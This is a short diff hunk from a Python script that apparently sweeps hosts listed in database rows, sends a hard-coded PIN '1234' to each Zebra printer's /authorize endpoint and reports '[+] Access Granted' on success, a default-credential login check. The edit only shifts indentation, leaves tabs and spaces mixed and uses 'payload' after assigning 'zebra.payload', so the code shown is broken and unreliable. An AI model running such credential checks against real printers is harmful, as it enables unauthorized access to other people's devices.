@@ -684,12 +684,10 @@ if rows:
 			zebra.payload = {"0": "1234"}
 			url = f"http://{row[0]}/authorize"
 			try:
-            # Send the POST request using the requests library
-            response = requests.post(url, data=payload, timeout=timeout_seconds)
-            
-            # Check for the "Access Granted" string in the response text
-            if "Access Granted" in response.text:
-                print(f"[+] Access Granted for {row[0]}")
+            	# Send the POST request using the requests library
+            	response = requests.post(url, data=payload, timeout=timeout_seconds)
+	            if "Access Granted" in response.text:
+    	            print(f"[+] Access Granted for {row[0]}")
 				
 		print("END -- Zebra printers above")
 	elif choice in no:
